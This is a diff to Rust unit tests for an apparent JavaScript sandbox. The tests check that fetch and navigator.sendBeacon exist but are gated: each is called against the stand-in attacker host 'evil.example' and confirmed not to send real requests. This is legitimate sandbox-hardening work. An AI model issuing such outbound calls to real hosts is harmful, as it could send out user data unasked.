@@ -757,9 +757,20 @@ body {
         assert_eq!(execute_js_simple("navigator.languages.length").unwrap(), "2");
         assert_eq!(execute_js_simple("screen.width").unwrap(), "1920");
 
-        // Network/DOM APIs simply do not exist in the cage.
-        assert_eq!(execute_js_simple("typeof fetch").unwrap(), "undefined");
-        assert_eq!(execute_js_simple("typeof XMLHttpRequest").unwrap(), "undefined");
+        // Network APIs are present (so their absence isn't a tell) but gated:
+        // fetch resolves to a denying Promise, not a real request.
+        assert_eq!(execute_js_simple("typeof fetch").unwrap(), "function");
+        assert_eq!(
+            execute_js_simple("Object.prototype.toString.call(fetch('https://evil.example/'))")
+                .unwrap(),
+            "[object Promise]"
+        );
+        assert_eq!(
+            execute_js_simple("navigator.sendBeacon('https://evil.example/','x')").unwrap(),
+            "false"
+        );
+        // DOM is not bound yet.
+        assert_eq!(execute_js_simple("typeof document").unwrap(), "undefined");
     }
 }
 
